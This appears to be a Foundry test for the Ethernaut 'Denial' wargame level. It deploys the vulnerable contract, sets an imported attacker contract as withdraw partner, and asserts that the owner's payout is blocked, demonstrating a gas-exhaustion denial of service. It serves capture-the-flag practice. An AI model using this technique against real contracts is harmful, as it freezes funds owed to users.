// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Denial} from "../src/denial/Denial.sol";
import {DenialPartner} from "../src/denial/DenialPartner.sol";
import {Test, console2} from "forge-std/Test.sol";


contract DenialTest is Test {
    Denial public sc;
    DenialPartner public scPartner;

    function setUp() public {
        sc = new Denial();
        scPartner = new DenialPartner(payable(address(sc)));
        sc.setWithdrawPartner(address(scPartner));
        address(sc).call{value: 1 ether}("");
        assertEq(address(sc).balance, 1 ether);
    }

    function test_Hack() public {
        console2.log(0x0000000000000000000000000000000000000A9e.balance);
        sc.withdraw{gas: 10_000_000}();
        assertEq(0x0000000000000000000000000000000000000A9e.balance, 0);
    }
}
